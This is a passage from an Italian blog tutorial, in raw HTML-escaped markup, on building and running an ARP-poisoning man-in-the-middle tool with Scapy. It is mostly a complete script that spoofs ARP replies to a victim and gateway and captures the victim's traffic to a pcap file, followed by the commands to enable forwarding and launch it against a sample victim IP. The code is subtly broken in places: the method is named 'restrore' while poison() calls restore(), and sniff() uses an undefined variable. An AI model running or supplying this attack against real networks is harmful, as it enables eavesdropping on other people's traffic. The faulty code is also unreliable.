        bpf_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip host &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; victim
        packets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sniff(count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;count, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bpf_filter, iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface)
        wrpcap(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arper.pcap&amp;#39;&lt;/span&gt;, packets)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Got the packets&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restrore()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminate()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Finished.&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;sniff&lt;/strong&gt; resta in pausa per cinque secondi prima di iniziare lo &lt;em&gt;sniffing&lt;/em&gt; per dare tempo al thread che esegue il vero e proprio &lt;em&gt;poisoning&lt;/em&gt; di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l’indirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo &lt;em&gt;arper.pcap&lt;/em&gt;, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l’attacco.&lt;/p&gt;
&lt;p&gt;Da ultimo, il metodo &lt;strong&gt;restore&lt;/strong&gt; riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restrore&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Restoring ARP Tables...&amp;#39;&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;restore&lt;/strong&gt; potrebbe essere chiamato sia da &lt;strong&gt;poison&lt;/strong&gt; (dopo un CTRL-C), sia da &lt;strong&gt;sniff&lt;/strong&gt; (quando il numero di pacchetti richiesti è stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.&lt;/p&gt;
&lt;p&gt;Ecco il codice completo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; multiprocessing &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Process
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
    packet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ether(dst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ARP(op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;who-has&amp;#34;&lt;/span&gt;, pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;targetip)
    resp, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; srp(packet, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, retry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, verbose&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _, r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r[Ether]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;src
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(victim)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gateway
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(gateway)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;verb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Initialized &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gateway (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;gateway&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Victim (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;victim&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
        poison_victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        poison_gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac

        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Beginning the ARP poison. [CTRL-C to stop]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
                send(poison_victim)
                send(poison_gateway)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restore()
                sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sniffing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; packets&amp;#39;&lt;/span&gt;)
        bpf_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip host &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; victim
        packets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sniff(count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;count, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bpf_filter, iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface)
        wrpcap(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arper.pcap&amp;#39;&lt;/span&gt;, packets)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Got the packets&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restrore()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminate()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Finished.&amp;#39;&lt;/span&gt;)
        
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restrore&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Restoring ARP Tables...&amp;#39;&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        send(ARP(
            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac, 
            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    (victim, gateway, interface) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
    myarp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arper(victim, gateway, interface)
    myarp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Prima di avviare l’attacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo echo &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/net/ipv4/ip_forward
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora che l’IP forwarding è stato importato, avviamo lo script con:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo python3 arper.py &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;IP vittima&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;IP gateway&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ad esempio:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L’output durante l’attacco:&lt;/p&gt;
